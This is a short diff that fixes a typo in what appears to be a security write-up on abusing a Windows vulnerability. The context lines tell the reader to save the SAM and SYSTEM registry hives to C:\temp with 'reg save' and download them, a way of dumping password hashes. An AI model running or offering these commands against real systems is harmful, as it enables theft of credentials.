@@ -409,7 +409,7 @@ To abuse this vulnerability you should follow these steps:
 mkdir C:\temp
 ```
 
-2) Cooy the sam and system hive of HKLM to C:\temp and then download them.
+2) Copy the sam and system hive of HKLM to C:\temp and then download them.
 
 ```
 reg save hklm\sam C:\temp\sam.hive
